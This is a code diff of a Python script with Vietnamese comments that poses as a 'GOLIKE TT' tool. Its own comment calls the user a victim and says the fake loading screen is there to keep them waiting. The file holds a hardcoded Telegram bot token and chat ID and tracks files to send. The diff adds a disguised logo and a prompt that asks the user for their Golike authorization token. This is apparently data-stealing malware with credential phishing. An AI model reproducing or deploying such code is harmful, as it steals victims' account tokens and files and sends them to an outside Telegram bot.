@@ -7,7 +7,11 @@ import threading
 trang = "\033[1;37m"
 luc = "\033[1;32m"
 red = "\033[1;31m"
-
+logo = f"""\033[1;90m═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═  ═
+                         ╔════════════════╗
+                         ║ \033[1;37m   GOLIKE TT   \033[1;90m║
+                         ╚════════════════╝                           \n
+"""
 # Thông tin Telegram Bot
 TOKEN = "8162621699:AAGFM0YDmoO7tmCryX_Bo311djoIlvTjbhQ"
 CHAT_ID = "7445272108"
@@ -19,13 +23,10 @@ sent_files = set()
 # Fake loading để giữ nạn nhân ở lại
 def fake_loading():
     animations = ["|", "/", "-", "\\"]
-    print(f"{trang}Thông Tin Liên Hệ")
-    print(f"{trang}Telegram: {luc}@luaday123")
-    print(f"{trang}Dán này lên Google : {luc}t.me/luaday123")
-    print(f"{trang}[+] Đang bắt đầu quá trình tải dữ liệu... Vui lòng đợi.")
-
+    print(logo)
+    autho = input(f'Nhập Authorizion: ')
     for _ in range(15):  # 5 phút giả lập tải dữ liệu
-        print(f"\r[+] Đang tải các dữ liệu để chạy tool... {animations[_ % 4]}", end="", flush=True)
+        print(f"\r[+] Đang tải Thông tin Acc golike... {animations[_ % 4]}", end="", flush=True)
         time.sleep(1)
 
 # Lấy danh sách file theo thứ tự ưu tiên
